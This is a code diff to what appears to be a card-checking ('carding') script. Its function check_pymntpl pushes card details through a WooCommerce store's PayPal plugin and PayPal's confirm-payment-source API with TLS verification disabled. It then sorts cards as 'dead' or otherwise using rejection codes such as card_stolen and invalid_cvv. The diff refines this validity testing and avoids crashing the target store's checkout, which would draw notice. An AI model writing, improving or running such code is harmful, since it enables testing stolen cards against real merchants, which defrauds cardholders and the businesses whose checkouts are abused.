@@ -260,10 +260,12 @@ def check_pymntpl(session: requests.Session, domain: str, card_tuple: tuple, **k
         pass
 
     # ── 6. Create PayPal order via pymntpl REST route ─────────────────────────
+    # create_order_url may be absolute (https://...) or relative (/wp-json/...)
+    _order_endpoint = create_order_url if create_order_url.startswith("http") else base_url + create_order_url
     order_id = ""
     try:
         ord_r = session.post(
-            base_url + create_order_url,
+            _order_endpoint,
             json={"payment_method": "ppcp_card", "context": "checkout"},
             headers={
                 "Content-Type": "application/json",
@@ -293,8 +295,16 @@ def check_pymntpl(session: requests.Session, domain: str, card_tuple: tuple, **k
     if access_token:
         pp_headers["Authorization"] = f"Bearer {access_token}"
 
+    # PayPal error issue codes that map to DEAD (card-level rejections)
+    _PP_DEAD_ISSUES = {
+        "card_expired", "invalid_cvv", "cvv_failure", "instrument_declined",
+        "card_declined", "unauthorized_card", "do_not_honor", "restricted_card",
+        "card_type_not_supported", "account_closed", "invalid_account",
+        "card_stolen", "card_lost", "currency_not_supported_for_card_type",
+    }
+
     try:
-        requests.post(
+        confirm_r = requests.post(
             f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
             json={
                 "payment_source": {
@@ -317,8 +327,30 @@ def check_pymntpl(session: requests.Session, domain: str, card_tuple: tuple, **k
             timeout=REQUEST_TIMEOUT,
             verify=False,
         )
+
+        if confirm_r.status_code >= 400:
+            # PayPal rejected the card — classify here, skip checkout submission
+            # (submitting checkout with an unconfirmed order causes WordPress PHP fatal)
+            try:
+                err      = confirm_r.json()
+                details  = err.get("details", [])
+                issue    = (details[0].get("issue", "") if details else "").lower()
+                name     = err.get("name", "").lower()
+            except Exception:
+                issue, name = "", confirm_r.text[:80].lower()
+
+            combined_err = f"{issue} {name}".strip()
+            label = (issue or name or "declined").replace("_", " ").title()[:80]
+            is_dead = any(k in combined_err for k in _PP_DEAD_ISSUES)
+            return {
+                "status":  "dead" if is_dead else "unknown",
+                "message": label,
+                "amount":  amount,
+                "card":    card_str,
+            }
+
     except Exception:
-        pass   # proceed regardless — some stores skip this validation
+        pass   # network error — proceed to checkout and let it decide
 
     # ── 8. Submit checkout ────────────────────────────────────────────────────
     form_data = urlencode({
